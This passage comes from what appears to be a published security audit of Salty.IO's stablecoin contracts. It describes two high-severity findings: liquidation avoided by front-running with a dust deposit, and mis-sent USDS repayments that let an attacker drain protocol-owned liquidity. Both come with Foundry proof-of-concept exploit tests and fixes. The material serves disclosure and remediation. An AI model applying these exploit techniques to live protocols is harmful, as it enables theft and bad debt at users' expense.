// Filename: src/stable/tests/CollateralAndLiquidity.t.sol:TestCollateral// $ forge test --match-test "testUserLiquidationMayBeAvoided" --rpc-url https://yoururl -vv//functiontestUserLiquidationMayBeAvoided()public{// Liquidatable user can avoid liquidation//// Have bob deposit so alice can withdraw everything without DUST reserves restriction_depositHalfCollateralAndBorrowMax(bob);//// 1. Alice deposit and borrow the max amount// Deposit and borrow for Alice_depositHalfCollateralAndBorrowMax(alice);// Check if Alice has a positionassertTrue(_userHasCollateral(alice));//// 2. Crash the collateral price_crashCollateralPrice();vm.warp(block.timestamp+1days);//// 3. Alice maliciously front run the liquidation action and deposit a DUST amountvm.prank(alice);collateralAndLiquidity.depositCollateralAndIncreaseShare(PoolUtils.DUST+1,PoolUtils.DUST+1,0,block.timestamp,false);//// 4. The function alice liquidation will be reverted by "Must wait for the cooldown to expire"vm.expectRevert("Must wait for the cooldown to expire");collateralAndLiquidity.liquidateUser(alice);}
Recommended Mitigation Steps
Consider modifying theliquidationfunction as follows:
function liquidateUser( address wallet ) external nonReentrant{require( wallet != msg.sender, "Cannot liquidate self" );// First, make sure that the user's collateral ratio is below the required levelrequire( canUserBeLiquidated(wallet), "User cannot be liquidated" );uint256 userCollateralAmount = userShareForPool( wallet, collateralPoolID );// Withdraw the liquidated collateral from the liquidity pool.// The liquidity is owned by this contract so when it is withdrawn it will be reclaimed by this contract.(uint256 reclaimedWBTC, uint256 reclaimedWETH) = pools.removeLiquidity(wbtc, weth, userCollateralAmount, 0, 0, totalShares[collateralPoolID] );// Decrease the user's share of collateral as it has been liquidated and they no longer have it.--		_decreaseUserShare( wallet, collateralPoolID, userCollateralAmount, true );++		 _decreaseUserShare( wallet, collateralPoolID, userCollateralAmount, false );// The caller receives a default 5% of the value of the liquidated collateral.uint256 rewardPercent = stableConfig.rewardPercentForCallingLiquidation();uint256 rewardedWBTC = (reclaimedWBTC * rewardPercent) / 100;uint256 rewardedWETH = (reclaimedWETH * rewardPercent) / 100;// Make sure the value of the rewardAmount is not excessiveuint256 rewardValue = underlyingTokenValueInUSD( rewardedWBTC, rewardedWETH ); // in 18 decimalsuint256 maxRewardValue = stableConfig.maxRewardValueForCallingLiquidation(); // 18 decimalsif ( rewardValue > maxRewardValue ){rewardedWBTC = (rewardedWBTC * maxRewardValue) / rewardValue;rewardedWETH = (rewardedWETH * maxRewardValue) / rewardValue;}// Reward the callerwbtc.safeTransfer( msg.sender, rewardedWBTC );weth.safeTransfer( msg.sender, rewardedWETH );// Send the remaining WBTC and WETH to the Liquidizer contract so that the tokens can be converted to USDS and burned (on Liquidizer.performUpkeep)wbtc.safeTransfer( address(liquidizer), reclaimedWBTC - rewardedWBTC );weth.safeTransfer( address(liquidizer), reclaimedWETH - rewardedWETH );// Have the Liquidizer contract remember the amount of USDS that will need to be burned.uint256 originallyBorrowedUSDS = usdsBorrowedByUsers[wallet];liquidizer.incrementBurnableUSDS(originallyBorrowedUSDS);// Clear the borrowedUSDS for the user who was liquidated so that they can simply keep the USDS they previously borrowed.usdsBorrowedByUsers[wallet] = 0;_walletsWithBorrowedUSDS.remove(wallet);emit Liquidation(msg.sender, wallet, reclaimedWBTC, reclaimedWETH, originallyBorrowedUSDS);}
This modification ensures that theuser.cooldownExpirationexpiration check does not interfere with theliquidationprocess, mitigating the identified security risk.
othernet-global (Salty.IO) confirmed and commented:
The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9
Status:Mitigation confirmed. Full details in reports fromzzebra83,0xpiken, andt0x1c.

[H-06] When borrowers repay USDS, it is sent to the wrong address, allowing anyone to burn Protocol Owned Liquidity and build bad debt for USDS
Submitted bynonseodion, also found byToshii,lanrebayode77,Aymen0909,KingNFT,juancito,00xSEV,fnanni,oakcobalt,chaduke,israeladelaja,Ephraim, zach (1,2),Drynooo,solmaxis69,pkqs90,wangxx2026,ether_sky,0x3b,LeoGold,Jorgect,0xAlix2,0xRobocop,0xanmol,djxploit,ayden, andklau5
When a user repays the USDS he has borrowed, it is taken from him and kept for burning. The Liquidizer contract is updated with the new amount repaid. The USDS is burnt whenever theperformUpkeepfunction is called on Liquidizer by the Upkeep contract during upkeep.
The USDS collected is sent to the USDS contract which can be burned wheneverburnTokensInContractis called. The amount of USDS to be burnt in the Liquidizer contract is also increased by theincrementBurnableUSDScall. This increases theusdsThatShouldBeBurnedvariable on the Liquidizer.
functionrepayUSDS(uint256amountRepaid)externalnonReentrant{...usds.safeTransferFrom(msg.sender,address(usds),amountRepaid);// Have USDS remember that the USDS should be burnedliquidizer.incrementBurnableUSDS(amountRepaid);...}
During upkeep, the Liquidizer first checks if it has enough USDS balance to burn i.eusdsBalance >= usdsThatShouldBeBurned. If it does it burns them else it converts Protocol Owned Liquidity (POL) to USDS and burns it to cover the deficit. Burning POL allows the protocol to cover bad debt from liquidation.
function_possiblyBurnUSDS()internal{...uint256usdsBalance=usds.balanceOf(address(this));if(usdsBalance>=usdsThatShouldBeBurned){// Burn only up to usdsThatShouldBeBurned.// Leftover USDS will be kept in this contract in case it needs to be burned later._burnUSDS(usdsThatShouldBeBurned);usdsThatShouldBeBurned=0;}else{// The entire usdsBalance will be burned - but there will still be an outstanding balance to burn later_burnUSDS(usdsBalance);usdsThatShouldBeBurned-=usdsBalance;// As there is a shortfall in the amount of USDS that can be burned, liquidate some Protocol Owned Liquidity and// send the underlying tokens here to be swapped to USDSdao.withdrawPOL(salt,usds,PERCENT_POL_TO_WITHDRAW);dao.withdrawPOL(dai,usds,PERCENT_POL_TO_WITHDRAW);}}
Since theusdsThatShouldBeBurnedvariable will always be increased without increasing the Liquidizer balance, it will always sell POL to cover the increase.
If the POL is exhausted, the protocol cannot cover bad debt generated from liquidations. This will affect the price of USDS negatively.
An attacker can borrow and repay multiple times to exhaust POL and create bad debt or it could just be done over time as users repay their USDS.
Impact
This will affect the price of USDS negatively.
Proof of Concept
This test can be run inCollateralAndLiquidity.t.sol.
functiontestBurnPOL()public{// setupvm.prank(address(collateralAndLiquidity));usds.mintTo(address(dao),20000ether);vm.prank(address(teamVestingWallet));salt.transfer(address(dao),10000ether);vm.prank(DEPLOYER);dai.transfer(address(dao),10000ether);// create Protocol Owned Liquidity (POL)vm.startPrank(address(dao));collateralAndLiquidity.depositLiquidityAndIncreaseShare(salt,usds,10000ether,10000ether,0,block.timestamp,false);collateralAndLiquidity.depositLiquidityAndIncreaseShare(dai,usds,10000ether,10000ether,0,block.timestamp,false);vm.stopPrank();bytes32poolIDA=PoolUtils._poolID(salt,usds);bytes32poolIDB=PoolUtils._poolID(dai,usds);assertEq(collateralAndLiquidity.userShareForPool(address(dao),poolIDA),20000ether);assertEq(collateralAndLiquidity.userShareForPool(address(dao),poolIDB),20000ether);// Alice deposits collateralvm.startPrank(address(alice));wbtc.approve(address(collateralAndLiquidity),type(uint256).max);weth.approve(address(collateralAndLiquidity),type(uint256).max);collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(alice),weth.balanceOf(alice),0,block.timestamp,true);// Alice performs multiple borrows and repayments, increasing the// usdsThatShouldBeBurned variable in Liquidizerfor(uinti;i<100;i++){vm.startPrank(alice);uint256maxUSDS=collateralAndLiquidity.maxBorrowableUSDS(alice);collateralAndLiquidity.borrowUSDS(maxUSDS);uint256borrowed=collateralAndLiquidity.usdsBorrowedByUsers(alice);collateralAndLiquidity.repayUSDS(borrowed);}vm.startPrank(address(upkeep));// perform upkeep multiple times to cover bad debt// breaks when POL is exhaustedfor(;;){(,uintreserve1) =pools.getPoolReserves(dai,usds);if(reserve1*99/100<100)break;liquidizer.performUpkeep();}assertGt(liquidizer.usdsThatShouldBeBurned(),usds.balanceOf(address(liquidizer)));}
Recommended Mitigation Steps
Send the repaid USDS to the Liquidizer.
othernet-global (Salty.IO) confirmed and commented:
The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9
Status:Mitigation confirmed. Full details in reports from0xpiken,zzebra83, andt0x1c.

